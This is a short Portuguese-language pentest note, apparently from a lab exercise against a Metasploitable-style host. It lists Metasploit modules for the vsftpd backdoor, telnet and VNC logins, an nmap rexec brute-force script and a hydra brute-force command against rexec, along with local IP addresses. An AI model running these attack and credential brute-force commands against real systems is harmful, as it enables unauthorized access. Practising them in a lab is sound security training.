```bash
meu ip: 177.67.136.88
ip kali: 172.24.49.254
ip meta : 192.168.100.102

PAYLOAD cmd/unix/interact = vsft 3.2.4
PAYLOAD auxiliary/scanner/telnet/telnet_login = telnet 23

PAYLOAD scanner/vnc/vnc_login = VNC  ~~~ depois entrar com vncviewer 192.168.100.102:5900 :password

nmap -p 512 --script rexec-brute -v 192.168.100.102 ~~~~ pesquisar rexec_login e usar uns dos logins

┌──(luan㉿192.168.100.102)-[~/Desktop/porta_512_logins]
└─$ hydra -L /home/luan/Desktop/porta_512_logins/usuarios_512.txt -P /home/luan/Desktop/porta_512_logins/passwd_512.txt -vV 192.168.100.102 rexec

``` 
